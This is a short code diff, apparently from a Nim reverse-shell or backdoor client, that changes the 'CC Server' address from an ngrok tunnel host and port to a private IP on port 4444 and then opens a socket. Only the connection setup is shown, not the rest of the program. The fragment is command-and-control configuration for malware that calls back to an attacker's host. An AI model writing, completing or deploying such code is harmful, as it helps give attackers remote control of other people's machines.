@@ -4,8 +4,8 @@ import os
 
 
 # My CC Server IP and Port
-var ip = "2.tcp.ngrok.io"
-var port = 11606
+var ip = "172.18.59.30"
+var port = 4444
 
 # Create a new socket
 var socket = newSocket()
